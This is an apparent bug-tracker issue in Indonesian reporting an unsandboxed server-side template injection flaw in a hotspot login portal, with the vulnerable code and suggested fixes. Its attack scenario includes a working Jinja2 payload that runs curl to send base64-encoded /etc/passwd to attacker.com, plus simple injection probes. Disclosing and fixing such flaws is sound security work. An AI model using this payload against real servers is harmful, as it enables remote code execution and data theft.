@@ -1,0 +1,63 @@
+title:	[HIGH] Portal hotspot render_template_string tanpa sandbox — full SSTI public endpoint
+state:	OPEN
+author:	mikrofunakjs (Mikrofun AKJS)
+labels:	bug
+comments:	0
+assignees:	
+projects:	
+milestone:	
+issue-type:	
+parent:	
+sub-issues:	
+sub-issues-completed:	
+blocked-by:	
+blocking:	
+number:	13
+--
+## Bug: Portal Hotspot Public SSTI via render_template_string
+
+**Severity:** HIGH — endpoint publik (MikroTik hotspot) bisa kena SSTI tanpa perlu autentikasi
+
+**File:** `web/blueprints/portal/__init__.py` line 48-62
+
+### Root Cause
+Portal login hotspot menggunakan `render_template_string` LANGSUNG (bukan `safe_render_template_string`) untuk merender custom HTML:
+
+```python
+if template_choice == 'custom' and settings.get('portal_custom_html'):
+    return render_template_string(
+        settings['portal_custom_html'],
+        mac=mac, ip=ip, ...
+    )
+```
+
+BANDINGKAN dengan landing page (`app.py` line 389) yang minimal pakai `safe_render_template_string` (walaupun masih ada escape bug — issue #5). Portal hotspot TIDAK pakai sandbox SAMA SEKALI.
+
+### Kenapa Lebih Bahaya
+1. **Endpoint publik**: MikroTik hotspot redirect user ke `/portal/login` — TIDAK perlu login
+2. **Full Jinja2 environment**: Semua filter, globals, context processors tersedia
+3. **SSTI trivial**: Cukup inject `{{config}}` atau `{{request.application.__call__.__globals__}}`
+
+### Attack Scenario
+1. Admin dengan akses Portal Settings menyimpan custom HTML:
+```html
+{{ config.__class__.__init__.__globals__['os'].popen('curl http://attacker.com/$(cat /etc/passwd | base64 -w0)').read() }}
+```
+2. Setiap user hotspot yang di-redirect ke portal akan trigger SSTI
+3. Attacker bisa:
+   - Baca file server (/etc/passwd, config, .env)
+   - Execute command di server
+   - Curi session/cookie pelanggan lain
+   - Redirect ke phishing site
+
+### Impact
+- RCE (Remote Code Execution) via template injection
+- Server compromise melalui satu admin settings
+- Semua pengunjung portal hotspot terpengaruh
+
+### Fix
+1. **Minimal**: Ganti ke `safe_render_template_string` TANPA custom filter
+2. **Lebih baik**: Jangan render user-provided HTML sebagai Jinja2 template sama sekali
+3. **Paling aman**: Gunakan template engine non-code seperti Mustache/Handlebars untuk custom HTML, atau string replacement sederhana
+
+**Labels:** bug, security
